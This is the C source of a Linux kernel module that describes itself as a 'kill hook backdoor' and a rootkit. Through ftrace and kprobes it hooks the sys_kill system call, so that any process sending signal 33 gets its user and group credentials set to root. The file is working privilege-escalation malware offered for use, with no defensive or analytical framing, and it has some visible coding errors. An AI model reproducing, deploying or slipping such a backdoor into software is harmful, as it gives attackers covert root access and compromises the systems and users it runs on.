#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("P3R5157");
MODULE_DESCRIPTION("kill hook backdoor");
MODULE_VERSION("0.03");


#define RECURSIVE_FTRACE 0

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
#define SYSCALL_NAME(name) ("__x64_" name)
#else
#define SYSCALL_NAME(name) (name)
#endif

#define SYSCALL_HOOK(_name, _function, _original)	\
		{					\
			.name = SYSCALL_NAME(_name),	\
			.function = (_function),	\
			.original = (_original),	\
		}

static asmlinkage long (*real_kill)(const struct pt_regs *);

asmlinkage int kill_hook(const struct pt_regs *regs)
{
	struct cred *root;
	root = prepare_creds();

	if (root == NULL) {
		printk(KERN_INFO "rootback: root is null.\n");
		return 1;
	}
	
	int sig = regs->si;
	
	if(sig == 33) {
		root->uid.val = 0;
		root->gid.val = 0;
		root->euid.val = 0;
		root->egid.val = 0;
		root->suid.val = 0;
		root->sgid.val = 0;
		root->fsuid.val = 0;
		root->fsgid.val = 0;

		commit_creds(root);

		printk(KERN_INFO "rootback: gaining root.\n");
	}

	real_kill(regs);
	return 0;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define ftrace_regs pt_regs
static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs) {
	return fregs;
}
#endif

struct bitch {
	const char *name;
	void *function;
	void *original;
	unsigned long address;
	struct ftrace_ops ops;
};


// utility functions
static void notrace hooker_thunk(unsigned long ip, unsigned long pip,
				 struct ftrace_ops *ops,
				 struct ftrace_regs *fregs) {
	struct pt_regs *regs = ftrace_get_regs(fregs);
	struct bitch *hook = container_of(ops, 
					  struct bitch,
				  	  ops);

	#if RECURSIVE_FTRACE
	regs->ip = (unsigned long)hook->function;
    	#else
	if (!within_module(pip, THIS_MODULE)) {
		regs->ip = (unsigned long)hook->function;
	}
    	#endif
}

void kill_hookers(struct bitch *hookers, size_t all) {
	for (size_t kill = 0; kill < all; kill++) {
		int disown = unregister_ftrace_function(&hookers[kill].ops);

		if (disown) {
			pr_debug("kill_hooker: unregister failed: %d\n", disown); 
		}

		disown = ftrace_set_filter_ip(&hookers[kill].ops, hookers[kill].address, 1, 0);

		if (disown) {
			pr_debug("kill_hooker: filter ip failed: %d\n", disown);
		}
	}
	return;
}

int pimp_hookers(struct bitch *hookers, size_t hoes) {
	int misbehaving;
	size_t pimp;

	for (pimp = 0; pimp < hoes; pimp++) {	
    		#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
		struct kprobe kp = {
			.symbol_name = hookers[pimp].name
		};

		if (register_kprobe(&kp) < 0) { misbehaving = 0; }

		hookers[pimp].address = (unsigned long) kp.addr;
		unregister_kprobe(&kp);
		#else
		hooker[pimp].address = kallsyms_lookup_name(hookers[pimp].name);
		#endif

		if (!hookers[pimp].address) {
			pr_debug("find_hooker failed: %s\n", hookers[pimp].name);
			misbehaving = -ENOENT;
		}

		#if RECURSIVE_FTRACE
		*((unsigned long*) hookers[pimp].original) = hookers[pimp].address + MCOUNT_INSN_SIZE;
		#else
		*((unsigned long*) hookers[pimp].original) = hookers[pimp].address;
		#endif

		hookers[pimp].ops.func = hooker_thunk;
		hookers[pimp].ops.flags = FTRACE_OPS_FL_SAVE_REGS
			  | FTRACE_OPS_FL_RECURSION
			  | FTRACE_OPS_FL_IPMODIFY;

		misbehaving = ftrace_set_filter_ip(&hookers[pimp].ops,
						   hookers[pimp].address,
						   0, 0);

		if (misbehaving) {
			pr_debug("pimp_hooker: filter ip failed: %d\n", misbehaving);
			goto slap;
		}

		misbehaving = register_ftrace_function(&hookers[pimp].ops);

		if (misbehaving) {
			pr_debug("pimp_hooker: register failed: %d\n", misbehaving);
			ftrace_set_filter_ip(&hookers[pimp].ops, 
					     hookers[pimp].address,
					     1, 0);
			goto slap;
		}

		return 0;
	}

slap:
	kill_hookers(hookers, pimp);

	return misbehaving;
}


static struct bitch hookers[] = {
    SYSCALL_HOOK("sys_kill", kill_hook, &real_kill),
};


// entry and exit point
static int __init rootback_init(void)
{
	int err1 = pimp_hookers(hookers, ARRAY_SIZE(hookers));
	
	if (err1) { return err1; }

	printk(KERN_INFO "rootkit: kill hook loaded.\n");
	return 0;
}

static void __exit rootback_exit(void)
{
	kill_hookers(hookers, ARRAY_SIZE(hookers)); 
	printk(KERN_INFO "rootkit: kill hook removed.\n");
	return;
}


module_init(rootback_init);
module_exit(rootback_exit);
